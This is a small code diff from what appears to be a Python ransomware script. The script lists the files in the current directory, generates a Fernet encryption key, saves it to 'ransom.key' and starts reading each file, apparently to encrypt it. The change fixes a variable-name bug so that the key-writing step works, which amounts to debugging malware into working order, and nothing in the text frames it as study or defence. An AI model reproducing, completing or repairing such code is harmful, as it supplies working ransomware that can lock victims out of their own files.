@@ -15,7 +15,7 @@ for file in os.listdir():
 key = Fernet.generate_key()
 
 with open("ransom.key", "wb") as ransom_file:
-    f.write(key)
+    ransom_file.write(key)
 
 for file in files:
     with open(file, "rb") as ransom_file_read:
